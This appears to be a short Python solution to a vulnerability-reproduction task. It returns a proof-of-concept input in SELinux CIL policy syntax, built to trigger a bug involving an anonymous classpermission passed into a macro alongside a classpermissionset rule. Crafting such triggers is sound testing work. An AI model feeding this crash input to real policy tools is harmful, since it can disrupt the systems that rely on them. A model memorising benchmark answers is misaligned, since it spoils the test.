import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct minimal PoC based on vulnerability description
        # Anonymous classpermission passed into macro with classpermissionset rule
        poc_lines = [
            "(class test_class)",
            "(permission test_perm)",
            "(classpermissionset test_cpset (classpermission (class test_class) (permission test_perm)))",
            "(macro test_macro (cp) (classpermissionset test_cpset (classpermission cp)))",
            "(test_macro (classpermission (class test_class) (permission test_perm)))"
        ]
        
        # Join with newlines and encode to bytes
        poc = "\n".join(poc_lines)
        return poc.encode('utf-8')